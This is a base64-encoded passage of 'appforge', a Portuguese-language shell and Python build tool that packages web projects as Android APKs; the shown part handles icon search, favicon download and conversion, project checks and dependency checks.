Bjb252ZXJ0IChJbWFnZU1hZ2ljaykKdHJ5OgogICAgcj1zdWJwcm9jZXNzLnJ1bihbJ2NvbnZlcnQnLCctYmFja2dyb3VuZCcsJ3doaXRlJywnLXJlc2l6ZScsJzk2eDk2JyxzdmcscG5nXSwKICAgICAgICAgICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0aW1lb3V0PTEwKQogICAgaWYgci5yZXR1cm5jb2RlPT0wIGFuZCBvcy5wYXRoLmlzZmlsZShwbmcpIGFuZCBvcy5wYXRoLmdldHNpemUocG5nKT4xMDA6CiAgICAgICAgc3lzLmV4aXQoMCkKZXhjZXB0OiBwYXNzCgojIDQuIGNhaXJvc3ZnCnRyeToKICAgIGZyb20gY2Fpcm9zdmcgaW1wb3J0IHN2ZzJwbmcKICAgIHN2ZzJwbmcodXJsPSdmaWxlOi8vJytvcy5wYXRoLmFic3BhdGgoc3ZnKSx3cml0ZV90bz1wbmcsCiAgICAgICAgICAgIG91dHB1dF93aWR0aD05NixvdXRwdXRfaGVpZ2h0PTk2LGJhY2tncm91bmRfY29sb3I9J3doaXRlJykKICAgIGlmIG9zLnBhdGguaXNmaWxlKHBuZykgYW5kIG9zLnBhdGguZ2V0c2l6ZShwbmcpPjEwMDogc3lzLmV4aXQoMCkKZXhjZXB0OiBwYXNzCgpzeXMuZXhpdCgxKQoiIDI+L2Rldi9udWxsICYmIFsgLXMgIiRUTVBfUFJFVklFVyIgXSAmJiBTVkdfT0s9MQogICAgICBpZiBbICIkU1ZHX09LIiAtZXEgMSBdOyB0aGVuCiAgICAgICAgU0hPV19GSUxFPSIkVE1QX1BSRVZJRVciCiAgICAgIGVsc2UKICAgICAgICBybSAtZiAiJFRNUF9QUkVWSUVXIjsgVE1QX1BSRVZJRVc9IiIKICAgICAgICBwcmludGYgJyAgXHhlMlx4OTRceDgyIFwwMzNbMDs5MG0oU1ZHIOKAlCBzZWxlY2lvbmUgcGFyYSB1c2FyKVwwMzNbMG1cbicKICAgICAgICByZXR1cm4KICAgICAgZmkKICAgICAgOzsKICBlc2FjCiAgIyBFeGliZSBjb20gZnVuZG8gYnJhbmNvIGV4cGxpY2l0byAoZXZpdGEgdHJhbnNwYXJlbmNpYSBpbnZpc2l2ZWwgbm8gdGVybWluYWwgZXNjdXJvKQogIGxvY2FsIE9VVAogIE9VVD0kKHRpbWcgLVUgLWcgMzB4MTAgLWIgd2hpdGUgIiRTSE9XX0ZJTEUiIDI+L2Rldi9udWxsKQogIGlmIFsgLW4gIiRPVVQiIF07IHRoZW4KICAgIHByaW50ZiAnJXNcbicgIiRPVVQiIHwgc2VkICdzL14vICBceGUyXHg5NFx4ODIgLycKICBlbHNlCiAgICBwcmludGYgJyAgXHhlMlx4OTRceDgyIFwwMzNbMDs5MG0ocHJldmlldyBpbmRpc3Bvbml2ZWwpXDAzM1swbVxuJwogIGZpCiAgWyAtbiAiJFRNUF9QUkVWSUVXIiBdICYmIHJtIC1mICIkVE1QX1BSRVZJRVciCn0KX2ljb25fc2VhcmNoX2FuZF9zZWxlY3QoKSB7CiAgbG9jYWwgVEVSTT0iJDEiIFJFU1VMVF9GSUxFPSIkMiIKICBsb2NhbCBUTVBESVI7IFRNUERJUj0kKF9pY29uX21rdGVtcF9kaXIpCiAgWyAteiAiJFRNUERJUiIgXSAmJiB7IF93YXJuICdOYW8gZm9pIHBvc3NpdmVsIGNyaWFyIGRpcmV0b3JpbyB0ZW1wb3JhcmlvLic7IHJldHVybiAxOyB9CiAgcHJpbnRmICdcblwwMzNbMTszNW0gIFx4ZTJceDk1XHhhZFx4ZTJceDk0XHg4MFsgQXBwRm9yZ2UgSWNvbiBTZWFyY2ggXVwwMzNbMG1cbicKICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MlwwMzNbMG1cbicKICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MiBcMDMzWzBtXHhmMFx4OWZceDk0XHg4ZVwwMzNbMTszM20gUmVzdWx0YWRvcyBwYXJhOiAlc1wwMzNbMG1cbicgIiRURVJNIgogIHByaW50ZiAnXDAzM1sxOzM1bSAgXHhlMlx4OTRceDgyXDAzM1swbVxuJwogIHByaW50ZiAnXDAzM1sxOzM2bSAgLT4gVmVyaWZpY2FuZG8gY29uZXhhby4uLlwwMzNbMG1cbicKICBpZiAhIF9pY29uX2NoZWNrX25ldDsgdGhlbgogICAgcHJpbnRmICdcblwwMzNbMTszMW0gIFx4ZTJceDljXHg5NyBTZW0gY29uZXhhbyBjb20gYSBJbnRlcm5ldC5cMDMzWzBtXG4nCiAgICBwcmludGYgJyAgICBcMDMzWzA7OTBtVmVyaWZpcXVlIHN1YSBjb25leGFvIGUgdGVudGUgbm92YW1lbnRlLlwwMzNbMG1cblxuJwogICAgcm0gLXJmICIkVE1QRElSIjsgcmV0dXJuIDEKICBmaQogIHByaW50ZiAnXDAzM1sxOzM2bSAgLT4gQnVzY2FuZG8gaWNvbmVzIChJY29uaWZ5ICsgU2ltcGxlSWNvbnMgKyBGYXZpY29uKS4uLlwwMzNbMG1cbicKICBsb2NhbCBSRVNVTFRfTElORVM9KCkgUkVTVUxUX0NPVU5UPTAKICB3aGlsZSBJRlM9IHJlYWQgLXIgbGluZTsgZG8KICAgIFsgLW4gIiRsaW5lIiBdICYmIFJFU1VMVF9MSU5FUys9KCIkbGluZSIpICYmIFJFU1VMVF9DT1VOVD0kKChSRVNVTFRfQ09VTlQrMSkpCiAgZG9uZSA8IDwoX2ljb25fc2VhcmNoX2ljb25pZnkgIiRURVJNIiAiJFRNUERJUiIgMyAyPi9kZXYvbnVsbCkKICBpZiBbICIkUkVTVUxUX0NPVU5UIiAtbHQgNSBdOyB0aGVuCiAgICBsb2NhbCBzaV9yOyBzaV9yPSQoX2ljb25fc2VhcmNoX3NpbXBsZWljb25zICIkVEVSTSIgIiRUTVBESVIiICIkKChSRVNVTFRfQ09VTlQrMSkpIiAyPi9kZXYvbnVsbCkKICAgIFsgLW4gIiRzaV9yIiBdICYmIFJFU1VMVF9MSU5FUys9KCIkc2lfciIpICYmIFJFU1VMVF9DT1VOVD0kKChSRVNVTFRfQ09VTlQrMSkpCiAgZmkKICBpZiBbICIkUkVTVUxUX0NPVU5UIiAtbHQgNSBdOyB0aGVuCiAgICBsb2NhbCBnZl9yOyBnZl9yPSQoX2ljb25fc2VhcmNoX2dvb2dsZV9mYXZpY29uICIkVEVSTSIgIiRUTVBESVIiICIkKChSRVNVTFRfQ09VTlQrMSkpIiAyPi9kZXYvbnVsbCkKICAgIFsgLW4gIiRnZl9yIiBdICYmIFJFU1VMVF9MSU5FUys9KCIkZ2ZfciIpICYmIFJFU1VMVF9DT1VOVD0kKChSRVNVTFRfQ09VTlQrMSkpCiAgZmkKICBpZiBbICIkUkVTVUxUX0NPVU5UIiAtbHQgNSBdOyB0aGVuCiAgICBsb2NhbCBmaV9yOyBmaV9yPSQoX2ljb25fc2VhcmNoX2Zhdmljb25faW0gIiRURVJNIiAiJFRNUERJUiIgIiQoKFJFU1VMVF9DT1VOVCsxKSkiIDI+L2Rldi9udWxsKQogICAgWyAtbiAiJGZpX3IiIF0gJiYgUkVTVUxUX0xJTkVTKz0oIiRmaV9yIikgJiYgUkVTVUxUX0NPVU5UPSQoKFJFU1VMVF9DT1VOVCsxKSkKICBmaQogIGlmIFsgIiRSRVNVTFRfQ09VTlQiIC1lcSAwIF07IHRoZW4KICAgIHByaW50ZiAnXG5cMDMzWzE7MzNtICBceGUyXHg5Y1x4OTcgTmVuaHVtIGljb25lIGVuY29udHJhZG8gcGFyYTogJXNcMDMzWzBtXG4nICIkVEVSTSIKICAgIHByaW50ZiAnICAgIFwwMzNbMDs5MG1UZW50ZSBvdXRybyB0ZXJtbyAoZXg6IGFmIGljb24gc2VhcmNoIGNhbWVyYSlcMDMzWzBtXG5cbicKICAgIHJtIC1yZiAiJFRNUERJUiI7IHJldHVybiAxCiAgZmkKICBwcmludGYgJ1wwMzNbMTszMm0gIFx4ZTJceDljXHg5MyAlZCBpY29uZShzKSBlbmNvbnRyYWRvKHMpXDAzM1swbVxuJyAiJFJFU1VMVF9DT1VOVCIKICBmb3IgZW50cnkgaW4gIiR7UkVTVUxUX0xJTkVTW0BdfSI7IGRvCiAgICBsb2NhbCBudW07IG51bT0kKHByaW50ZiAnJXMnICIkZW50cnkiIHwgY3V0IC1kOiAtZjEpCiAgICBsb2NhbCBmaWxlOyBmaWxlPSQocHJpbnRmICclcycgIiRlbnRyeSIgfCBjdXQgLWQ6IC1mMy0pCiAgICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MlwwMzNbMG1cbicKICAgIHByaW50ZiAnXDAzM1sxOzM1bSAgXHhlMlx4OTRceDgyIFwwMzNbMTszNm1bJXNdXDAzM1swbVxuJyAiJG51bSIKICAgIHByaW50ZiAnXDAzM1sxOzM1bSAgXHhlMlx4OTRceDgyXDAzM1swbVxuJwogICAgX2ljb25fc2hvd190aW1nICIkZmlsZSIKICBkb25lCiAgcHJpbnRmICdcMDMzWzE7MzVtICBceGUyXHg5NFx4ODJcMDMzWzBtXG4nCiAgcHJpbnRmICdcMDMzWzE7MzVtICBceGUyXHg5NVx4YjBceGUyXHg5NFx4ODBceGUyXHg5ZVx4YTRcMDMzWzBtICcKICBsb2NhbCBTRUxFQ1RFRF9GSUxFPSIiIFNFTEVDVEVEX05VTT0iIgogIHdoaWxlIHRydWU7IGRvCiAgICBwcmludGYgJ1F1YWwgZGVzZWphIHVzYXI/IFsxLSVkIC8gcj1yZXBldGlyIC8gcT1jYW5jZWxhcl06ICcgIiRSRVNVTFRfQ09VTlQiCiAgICBJRlM9IHJlYWQgLXIgQ0hPSUNFIDwvZGV2L3R0eQogICAgY2FzZSAiJENIT0lDRSIgaW4KICAgICAgcXxRKSBwcmludGYgJ1xuICBcMDMzWzA7OTBtQ2FuY2VsYWRvLlwwMzNbMG1cblxuJzsgcm0gLXJmICIkVE1QRElSIjsgcmV0dXJuIDEgOzsKICAgICAgcnxSKSBybSAtcmYgIiRUTVBESVIiOyBfaWNvbl9zZWFyY2hfYW5kX3NlbGVjdCAiJFRFUk0iICIkUkVTVUxUX0ZJTEUiOyByZXR1cm4gJD8gOzsKICAgICAgJycpICBwcmludGYgJyAgXDAzM1sxOzMxbVx4ZTJceDljXHg5NyBPcGNhbyBpbnZhbGlkYS5cMDMzWzBtXG4gICcgOzsKICAgICAgKikKICAgICAgICBpZiBwcmludGYgJyVzJyAiJENIT0lDRSIgfCBncmVwIC1xRSAnXlswLTldKyQnIFwKICAgICAgICAgICAmJiBbICIkQ0hPSUNFIiAtZ2UgMSBdIDI+L2Rldi9udWxsIFwKICAgICAgICAgICAmJiBbICIkQ0hPSUNFIiAtbGUgIiRSRVNVTFRfQ09VTlQiIF0gMj4vZGV2L251bGw7IHRoZW4KICAgICAgICAgIFNFTEVDVEVEX0ZJTEU9JChwcmludGYgJyVzJyAiJHtSRVNVTFRfTElORVNbJCgoQ0hPSUNFLTEpKV19IiB8IGN1dCAtZDogLWYzLSkKICAgICAgICAgIFNFTEVDVEVEX05VTT0iJENIT0lDRSIKICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZQogICAgICAgICAgcHJpbnRmICcgIFwwMzNbMTszMW1ceGUyXHg5Y1x4OTcgT3BjYW8gaW52YWxpZGEuXDAzM1swbVxuJwogICAgICAgICAgcHJpbnRmICcgIFwwMzNbMDs5MG1ceGUyXHg5Y1x4OTMgRXNjb2xoYSBlbnRyZSAxIGUgJWQuXDAzM1swbVxuICAnICIkUkVTVUxUX0NPVU5UIgogICAgICAgIGZpIDs7CiAgICBlc2FjCiAgZG9uZQogIHByaW50ZiAnXG5cMDMzWzE7MzJtICBceGUyXHg5Y1x4OTMgSWNvbmUgIyVzIHNlbGVjaW9uYWRvXDAzM1swbVxuJyAiJFNFTEVDVEVEX05VTSIKICBwcmludGYgJ1wwMzNbMTszNm0gIC0+IFByb2Nlc3NhbmRvLi4uXDAzM1swbVxuJwogIGxvY2FsIEZJTkFMX1BORz0iJFRNUERJUi9zZWxlY3RlZC5wbmciCiAgaWYgX2ljb25fdG9fcG5nICIkU0VMRUNURURfRklMRSIgIiRGSU5BTF9QTkciIDE5MjsgdGhlbgogICAgcHJpbnRmICdcMDMzWzE7MzJtICBceGUyXHg5Y1x4OTMgSWNvbmUgcHJlcGFyYWRvXDAzM1swbVxuJwogICAgcHJpbnRmICclcycgIiRGSU5BTF9QTkciID4gIiRSRVNVTFRfRklMRSIKICAgIHJldHVybiAwCiAgZWxzZQogICAgX3dhcm4gJ0Vycm8gYW8gcHJvY2Vzc2FyIGljb25lIOKAlCB1c2FuZG8gcGxhY2Vob2xkZXInCiAgICBfZ2VuX2ljb24gIiRGSU5BTF9QTkciIDE5MgogICAgcHJpbnRmICclcycgIiRGSU5BTF9QTkciID4gIiRSRVNVTFRfRklMRSIKICAgIHJldHVybiAwCiAgZmkKfQpfaWNvbl9hdXRvX2Rpc2NvdmVyKCkgewogIGxvY2FsIFVSTD0iJDEiIFRNUERJUj0iJDIiCiAgcHJpbnRmICdcMDMzWzE7MzZtICAtPiBCdXNjYW5kbyBpY29uZSBhdXRvbWF0aWNvIHBhcmE6ICVzXDAzM1swbVxuJyAiJFVSTCIgPiYyCiAgcHl0aG9uMyAtYyAiCmltcG9ydCB1cmxsaWIucmVxdWVzdCwgcmUsIHN5cywgb3MKZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHVybHBhcnNlCnVybD0nJFVSTCc7IGRzdD0nJFRNUERJUi9hdXRvLnBuZycKaWYgbm90IHVybC5zdGFydHN3aXRoKCdodHRwJyk6IHVybD0naHR0cHM6Ly8nK3VybApIRFI9eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyKSBBcHBGb3JnZS8xLjMnLCdBY2NlcHQnOicqLyonfQpkZWYgZmV0Y2godSwgb3V0LCB0aW1lb3V0PTEwKToKICAgIHRyeToKICAgICAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1LGhlYWRlcnM9SERSKQogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsdGltZW91dD10aW1lb3V0KSBhcyByOgogICAgICAgICAgICBkYXRhPXIucmVhZCgpCiAgICAgICAgaWYgbGVuKGRhdGEpPDIwMDogcmV0dXJuIEZhbHNlCiAgICAgICAgb3BlbihvdXQsJ3diJykud3JpdGUoZGF0YSk7IHJldHVybiBUcnVlCiAgICBleGNlcHQ6IHJldHVybiBGYWxzZQpwYXJzZWQ9dXJscGFyc2UodXJsKTsgYmFzZT1wYXJzZWQuc2NoZW1lKyc6Ly8nK3BhcnNlZC5uZXRsb2MKZG9tYWluPXBhcnNlZC5uZXRsb2MucmVwbGFjZSgnd3d3LicsJycpCmlmIGZldGNoKCdodHRwczovL3d3dy5nb29nbGUuY29tL3MyL2Zhdmljb25zP2RvbWFpbj0nK2RvbWFpbisnJnN6PTEyOCcsIGRzdCk6CiAgICBpZiBvcy5wYXRoLmdldHNpemUoZHN0KT41MDA6IHByaW50KCdvazonK2RzdCk7IHN5cy5leGl0KDApCmlmIGZldGNoKCdodHRwczovL2Zhdmljb24uaW0vJytkb21haW4rJz9sYXJnZXI9dHJ1ZScsIGRzdCk6CiAgICBpZiBvcy5wYXRoLmdldHNpemUoZHN0KT41MDA6IHByaW50KCdvazonK2RzdCk7IHN5cy5leGl0KDApCmZvciBwYXRoIGluIFsnL2FwcGxlLXRvdWNoLWljb24ucG5nJywnL2FwcGxlLXRvdWNoLWljb24tMTgweDE4MC5wbmcnLCcvZmF2aWNvbi5wbmcnLCcvZmF2aWNvbi5pY28nXToKICAgIGlmIGZldGNoKGJhc2UrcGF0aCwgZHN0KSBhbmQgb3MucGF0aC5nZXRzaXplKGRzdCk+MjAwOiBwcmludCgnb2s6Jytkc3QpOyBzeXMuZXhpdCgwKQp0cnk6CiAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsaGVhZGVycz1IRFIpCiAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9MTApIGFzIHI6CiAgICAgICAgaHRtbD1yLnJlYWQoNjU1MzYpLmRlY29kZSgndXRmLTgnLCdyZXBsYWNlJykKICAgIGZvciBtIGluIHJlLmZpbmRpdGVyKHInPGxpbmtbXj5dK3JlbD1bXCJcXCddKFteXCJcXCc+XSppY29uW15cIlxcJz5dKilbXCJcXCddW14+XSpocmVmPVtcIlxcJ10oW15cIlxcJz5dKylbXCJcXCddJyxodG1sLHJlLkkpOgogICAgICAgIGhyZWY9bS5ncm91cCgyKQogICAgICAgIGlmIGhyZWYuc3RhcnRzd2l0aCgnaHR0cCcpOiBpY29uX3VybD1ocmVmCiAgICAgICAgZWxpZiBocmVmLnN0YXJ0c3dpdGgoJy8vJyk6IGljb25fdXJsPSdodHRwczonK2hyZWYKICAgICAgICBlbGlmIGhyZWYuc3RhcnRzd2l0aCgnLycpOiBpY29uX3VybD1iYXNlK2hyZWYKICAgICAgICBlbHNlOiBpY29uX3VybD1iYXNlKycvJytocmVmCiAgICAgICAgaWYgZmV0Y2goaWNvbl91cmwsIGRzdCkgYW5kIG9zLnBhdGguZ2V0c2l6ZShkc3QpPjIwMDoKICAgICAgICAgICAgcHJpbnQoJ29rOicrZHN0KTsgc3lzLmV4aXQoMCkKZXhjZXB0OiBwYXNzCnByaW50KCdmYWlsJyk7IHN5cy5leGl0KDEpCiIgMj4vZGV2L251bGwKfQpfY21kX2ljb24oKSB7CiAgbG9jYWwgU1VCQ01EPSIkezE6LX0iCiAgc2hpZnQgMj4vZGV2L251bGwgfHwgdHJ1ZQogIGNhc2UgIiRTVUJDTUQiIGluCiAgICBzZWFyY2gpCiAgICAgIGxvY2FsIFRFUk09IiQqIgogICAgICBbIC16ICIkVEVSTSIgXSAmJiB7IHByaW50ZiAnICBVc286IGFmIGljb24gc2VhcmNoIDx0ZXJtbz5cblxuJzsgZXhpdCAxOyB9CiAgICAgIGxvY2FsIFRNUF9SRVNVTFQ7IFRNUF9SRVNVTFQ9JChta3RlbXApCiAgICAgIGlmIF9pY29uX3NlYXJjaF9hbmRfc2VsZWN0ICIkVEVSTSIgIiRUTVBfUkVTVUxUIjsgdGhlbgogICAgICAgIGxvY2FsIElDT05fUEFUSDsgSUNPTl9QQVRIPSQoY2F0ICIkVE1QX1JFU1VMVCIgMj4vZGV2L251bGwpCiAgICAgICAgcm0gLWYgIiRUTVBfUkVTVUxUIgogICAgICAgIGlmIFsgLW4gIiRJQ09OX1BBVEgiIF0gJiYgWyAtZiAiJElDT05fUEFUSCIgXTsgdGhlbgogICAgICAgICAgcHJpbnRmICdcblwwMzNbMTszMm0gIEljb25lIHNhbHZvIGVtOiAlc1wwMzNbMG1cbicgIiRJQ09OX1BBVEgiCiAgICAgICAgICBwcmludGYgJ1wwMzNbMDs5MG0gIFVzZTogYXBwZm9yZ2UgYnVpbGQgLi4uIC0taWNvbiAlc1wwMzNbMG1cblxuJyAiJElDT05fUEFUSCIKICAgICAgICBmaQogICAgICBlbHNlCiAgICAgICAgcm0gLWYgIiRUTVBfUkVTVUxUIgogICAgICBmaSA7OwogICAgY2xlYW4pCiAgICAgIGxvY2FsIEZPUkNFPTAKICAgICAgZm9yIGFyZyBpbiAiJEAiOyBkbyBbICIkYXJnIiA9ICctLWZvcmNlJyBdICYmIEZPUkNFPTE7IGRvbmUKICAgICAgbG9jYWwgQkFTRT0iJF9JQ09OX1RJTUdfQkFTRSIKICAgICAgaWYgWyAhIC1kICIkQkFTRSIgXTsgdGhlbiBfaW5mbyAnTmVuaHVtIGNhY2hlIGRlIGljb25lcyBlbmNvbnRyYWRvLic7IHJldHVybiAwOyBmaQogICAgICBsb2NhbCBDT1VOVDsgQ09VTlQ9JChmaW5kICIkQkFTRSIgLW1pbmRlcHRoIDEgLW1heGRlcHRoIDEgLXR5cGUgZCAyPi9kZXYvbnVsbCB8IHdjIC1sKQogICAgICBpZiBbICIkQ09VTlQiIC1lcSAwIF07IHRoZW4gX2luZm8gJ05lbmh1bSB0ZW1wb3JhcmlvIHBhcmEgcmVtb3Zlci4nOyByZXR1cm4gMDsgZmkKICAgICAgaWYgWyAiJEZPUkNFIiAtZXEgMCBdOyB0aGVuCiAgICAgICAgcHJpbnRmICdcMDMzWzE7MzNtICBSZW1vdmVyICVkIGRpcmV0b3JpbyhzKSBlbSAlcz8gW3MvTl0gXDAzM1swbScgIiRDT1VOVCIgIiRCQVNFIgogICAgICAgIElGUz0gcmVhZCAtciBSRVNQIDwvZGV2L3R0eQogICAgICAgIGNhc2UgIiRSRVNQIiBpbiBzfFN8eXxZKSA6IDs7ICopIHByaW50ZiAnICBDYW5jZWxhZG8uXG4nOyByZXR1cm4gMCA7OyBlc2FjCiAgICAgIGZpCiAgICAgIHJtIC1yZiAiJEJBU0UiOyBfb2sgIkNhY2hlIHJlbW92aWRvICgkQ09VTlQgZGlyZXRvcmlvKHMpKSIgOzsKICAgICopCiAgICAgIHByaW50ZiAnXG5cMDMzWzE7MzVtICBhZiBpY29uIOKAlCBTaXN0ZW1hIGRlIGJ1c2NhIGRlIGljb25lc1wwMzNbMG1cblxuJwogICAgICBwcmludGYgJyAgXDAzM1sxOzMybVVzbzpcMDMzWzBtXG4nCiAgICAgIHByaW50ZiAnICAgIGFmIGljb24gc2VhcmNoIDx0ZXJtbz4gICDigJQgYnVzY2EgaW50ZXJhdGl2YVxuJwogICAgICBwcmludGYgJyAgICBhZiBpY29uIGNsZWFuICAgICAgICAgICAg4oCUIHJlbW92ZSB0ZW1wb3Jhcmlvc1xuJwogICAgICBwcmludGYgJyAgICBhZiBpY29uIGNsZWFuIC0tZm9yY2UgICAg4oCUIHJlbW92ZSBzZW0gY29uZmlybWFjYW9cblxuJyA7OwogIGVzYWMKfQpfY21kX2NoZWNrX3Byb2plY3QoKSB7CiAgbG9jYWwgRElSPSIkMSIKICBsb2NhbCBCPSdcMDMzWzE7MzRtJyBZPSdcMDMzWzE7MzNtJyBSPSdcMDMzWzE7MzFtJyBOPSdcMDMzWzBtJyBEPSdcMDMzWzA7OTBtJwogIFsgLXogIiRESVIiIF0gJiYgeyBfY21kX2hlbHA7IGV4aXQgMTsgfQogIFsgLWQgIiRESVIiIF0gfHwgX2VyciAiRGlyZXTDs3JpbyBuw6NvIGVuY29udHJhZG86ICRESVIiCiAgcHJpbnRmICJcblwwMzNbMTszNW0gID09IGFwcGZvcmdlIGNoZWNrOiAlcyA9PVwwMzNbMG1cblxuIiAiJERJUiIKICBsb2NhbCB0b3RhbCBodG1sX24gY3NzX24ganNfbiBvdGhlcl9uCiAgdG90YWw9JChmaW5kICIkRElSIiAtdHlwZSBmIHwgd2MgLWwpOyBodG1sX249JChmaW5kICIkRElSIiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiB8IHdjIC1sKQogIGNzc19uPSQoZmluZCAiJERJUiIgLXR5cGUgZiAtaW5hbWUgIiouY3NzIiB8IHdjIC1sKTsganNfbj0kKGZpbmQgIiRESVIiIC10eXBlIGYgLWluYW1lICIqLmpzIiB8IHdjIC1sKQogIG90aGVyX249JCgodG90YWwgLSBodG1sX24gLSBjc3NfbiAtIGpzX24pKQogIHByaW50ZiAiICAke0R9JWQgYXJxdWl2byhzKTogJWQgSFRNTCAgJWQgQ1NTICAlZCBKUyAgJWQgb3V0cm9zJHtOfVxuXG4iICIkdG90YWwiICIkaHRtbF9uIiAiJGNzc19uIiAiJGpzX24iICIkb3RoZXJfbiIKICBsb2NhbCBmYXRhbHM9MCB3YXJucz0wIG9rcz0wCiAgaWYgWyAhIC1mICIkRElSL2luZGV4Lmh0bWwiIF07IHRoZW4KICAgIHByaW50ZiAiICAke1J9W0ZBVEFMXSBpbmRleC5odG1sIGF1c2VudGUke059XG4iOyBmYXRhbHM9JCgoZmF0YWxzKzEpKQogIGVsc2UKICAgIHByaW50ZiAiICAke0J9W09LXSAgICBpbmRleC5odG1sIHByZXNlbnRlJHtOfVxuIjsgb2tzPSQoKG9rcysxKSkKICAgIGxvY2FsIGh0bWw7IGh0bWw9JChjYXQgIiRESVIvaW5kZXguaHRtbCIpCiAgICBpZiAhIHByaW50ZiAnJXMnICIkaHRtbCIgfCBncmVwIC1xaSAnPCFkb2N0eXBlIGh0bWw+JzsgdGhlbgogICAgICBwcmludGYgIiAgJHtSfVtGQVRBTF0gU2VtIDwhRE9DVFlQRSBodG1sPiR7Tn1cbiI7IGZhdGFscz0kKChmYXRhbHMrMSkpCiAgICBlbHNlIHByaW50ZiAiICAke0J9W09LXSAgICA8IURPQ1RZUEUgaHRtbD4ke059XG4iOyBva3M9JCgob2tzKzEpKTsgZmkKICAgIGlmICEgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICdjaGFyc2V0JzsgdGhlbgogICAgICBwcmludGYgIiAgJHtSfVtGQVRBTF0gU2VtIDxtZXRhIGNoYXJzZXQ+JHtOfVxuIjsgZmF0YWxzPSQoKGZhdGFscysxKSkKICAgIGVsc2UgcHJpbnRmICIgICR7Qn1bT0tdICAgIGNoYXJzZXQgcHJlc2VudGUke059XG4iOyBva3M9JCgob2tzKzEpKTsgZmkKICAgIGlmICEgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICduYW1lPSJ2aWV3cG9ydCInOyB0aGVuCiAgICAgIHByaW50ZiAiICAke1J9W0ZBVEFMXSBTZW0gPG1ldGEgdmlld3BvcnQ+JHtOfVxuIjsgZmF0YWxzPSQoKGZhdGFscysxKSkKICAgIGVsc2UgcHJpbnRmICIgICR7Qn1bT0tdICAgIHZpZXdwb3J0IHByZXNlbnRlJHtOfVxuIjsgb2tzPSQoKG9rcysxKSk7IGZpCiAgZmkKICBwcmludGYgIlxuICAke0R94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAJHtOfVxuIgogIGlmIFsgIiRmYXRhbHMiIC1lcSAwIF0gJiYgWyAiJHdhcm5zIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtCfVByb2pldG8gbGltcG8g4oCUICVkIHZlcmlmaWNhY29lcyBPSy4ke059XG5cbiIgIiRva3MiCiAgZWxpZiBbICIkZmF0YWxzIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtZfSVkIGF2aXNvKHMpIOKAlCBwb2RlIGNvbXBpbGFyLiR7Tn1cbiAgJHtCfSVkIE9LJHtOfVxuXG4iICIkd2FybnMiICIkb2tzIgogIGVsc2UKICAgIHByaW50ZiAiICAke1J9JWQgZXJybyhzKSBmYXRhbChpcykuJHtOfVxuIiAiJGZhdGFscyIKICAgIHByaW50ZiAiICAke0J9JWQgT0ske059XG5cbiIgIiRva3MiCiAgZmkKfQpfY21kX2NoZWNrKCkgewogIGlmIFsgLW4gIiR7MTotfSIgXSAmJiBbIC1kICIkMSIgXTsgdGhlbiBfY21kX2NoZWNrX3Byb2plY3QgIiQxIjsgcmV0dXJuOyBmaQogIF9oZWFkICdhcHBmb3JnZSBjaGVjaycKICBsb2NhbCBvaz0xCiAgZm9yIGNtZCBpbiBhYXB0MiBlY2ogZHggYXBrc2lnbmVyIHppcGFsaWduIHB5dGhvbjMga2V5dG9vbDsgZG8KICAgIGNvbW1hbmQgLXYgIiRjbWQiID4vZGV2L251bGwgMj4mMSAmJiBfb2sgIiRjbWQiIHx8IHsgX3dhcm4gIiRjbWQgbmFvIGVuY29udHJhZG8iOyBvaz0wOyB9CiAgZG9uZQogIFsgLWYgIiRXMkFfSkFSIiBdICYmIF9vayAiYW5kcm9pZC5qYXIgLT4gJFcyQV9KQVIiIHx8IHsgX3dhcm4gJ2FuZHJvaWQuamFyIGF1c2VudGUgLS0geHBtIGluc3RhbGwgYXBwZm9yZ2UnOyBvaz0wOyB9CiAgY29tbWFuZCAtdiB0aW1nID4vZGV2L251bGwgMj4mMSAmJiBfb2sgInRpbWcgKGljb24gcHJldmlldykiIHx8IF93YXJuICJ0aW1nIGF1c2VudGUgKG9wY2lvbmFsKSAtLSBwa2cgaW5zdGFsbCB0aW1nIgogIGNvbW1hbmQgLXYgY3VybCA+L2Rldi9udWxsIDI+JjEgJiYgX29rICJjdXJsIChpY29uIGRvd25sb2FkKSIgfHwgX3dhcm4gImN1cmwgYXVzZW50ZSAtLSBwa2cgaW5zdGFsbCBjdXJsIgogIFsgIiRvayIgLWVxIDEgXSAmJiBwcmludGYgJ1xuXDAzM1sxOzMybSAgVHVkbyBwcm9udG8uXDAzM1swbVxuXG4nIHx8IHByaW50ZiAnXG5cMDMzWzE7MzNtICBJbnN0YWxlIG9zIGl0ZW5zIGFjaW1hLlwwMzNbMG1cblxuJwp9Cl9jbWRfaGVscCgpIHsKICBwcmludGYgJ1xuXDAzM1sxOzM1bSAgYXBwZm9yZ2UgdiVzIC0tIEVsbGlvdE9TIEhUTUwvQ1NTL0pTIDwtPiBBUEtcMDMzWzBtXG5cbicgIiRWRVJTSU9OIgogIHByaW50ZiAnICBcMDMzWzE7MzJtVXNvOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBhcHBmb3JnZSBidWlsZCA8ZGlyPiBbb3Bjb2VzXSAgICAgXDAzM1swOzkwbSMgV2ViIC0+IEFQS1wwMzNbMG1cbicKICBwcmludGYgJyAgICBhcHBmb3JnZSBidWlsZCAtLXVybCA8aHR0cHM6Ly8uLi4+IFtvcGNvZXNdXG4nCiAgcHJpbnRmICcg